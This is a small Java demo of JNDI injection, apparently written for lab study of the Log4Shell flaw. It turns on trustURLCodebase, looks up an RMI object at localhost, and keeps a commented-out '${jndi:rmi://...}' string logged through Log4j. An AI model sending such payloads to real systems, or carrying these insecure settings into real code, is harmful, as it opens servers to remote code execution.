package jndi;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class Application {
    private static final Logger logger = LogManager.getLogger(Application.class);
    public static void main(String[] args) {

        test();
/*        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

        String user = "${jndi:rmi://127.0.0.1:1099/obj}";
        logger.info("user:{}", user);*/
    }

    public static void test() {
        try {
            System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
            String url = "rmi://127.0.0.1:1099/obj";
            InitialContext initialContext = new InitialContext();
            initialContext.lookup(url);
        } catch (NamingException e) {
            e.printStackTrace();
        }
    }
}
